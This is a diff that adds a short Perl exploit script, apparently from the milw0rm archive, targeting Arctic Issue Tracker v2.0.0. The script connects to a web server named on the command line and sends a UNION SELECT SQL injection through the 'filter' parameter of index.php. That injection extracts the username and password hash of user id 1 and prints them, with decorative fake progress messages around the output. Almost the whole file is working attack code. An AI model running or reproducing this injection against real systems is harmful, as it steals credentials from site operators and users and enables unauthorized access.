@@ -1,0 +1,87 @@
+#!/usr/bin/perl
+ 
+use IO::Socket;
+ 
+
+print q{
+-----------------------------------------------
+Arctic Issue Tracker v2.0.0 exploit by ldma
+              ~ SubCode ~
+use: arctic.pl [server] [dir]
+sample:
+$perl arctic.pl localhost /arctic/
+-----------------------------------------------
+ 
+};
+ 
+$webpage = $ARGV[0];
+$directory = $ARGV[1];
+print "+-initiating\n";
+print "|--modules..OK!\n";
+        sleep 1;
+print "|--premodules..OK!\n";
+        sleep 1;
+print "|--preprocessors..OK!\n";
+        sleep 1;
+print "+-opening channel.. OK!\n";
+        sleep 2;
+print "--------------------------------------------\n";
+print "~ configuration complete.. OK!\n";
+print "~ scanning";
+$|=1;
+foreach (1..2) {
+        print ".";
+        sleep 1;
+        }
+print " OK!\n";
+if (!$webpage) { die "\+ rtfm geek\n"; }
+ 
+$wbb_dir =
+"http://".$webpage.$directory."index.php?filter=-1%20union%20select%201,2,3,concat(username,0x3a,password),5%20from%20arctic_user%20where%20id=1--";
+ 
+print "~ connecting";
+$|=1;
+foreach (1..1) {
+        print ".";
+        sleep 1;
+        }
+print " OK!\n";
+$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$webpage", PeerPort=>"80") || die "[+] Can't connect to Server\n";
+ 
+print "~ open exploiting-tree";
+$|=1;
+foreach (1..2) {
+        print ".";
+        sleep 1;
+        }
+print " OK!\n";
+print $sock "GET $wbb_dir HTTP/1.1\n";
+print $sock "Accept: */*\n";
+print $sock "User-Agent: Hacker\n";
+print $sock "Host: $webpage\n";
+print $sock "Connection: close\n\n";
+print "[+] Target: $webpage\n";
+while ($answer = <$sock>) {
+if ($answer =~ /Current Filter: <strong>(.*)<\/strong>/) {
+print "exploiting in progress";
+$|=1;
+foreach (1..3) {
+        print "...";
+        sleep 1;
+        }
+ 
+ 
+print "OK!\n[+] vuln: OK!\n\n\nwell done, ldma!\n\n";
+print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
+print "[+] USER-ID: -1\n";
+print "[+] ID-HASH: $1\n";
+print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
+exit();
+}
+}
+ 
+close($sock);
+ 
+# ldma[2008-07-19] 
+
+# milw0rm.com [2008-07-21]
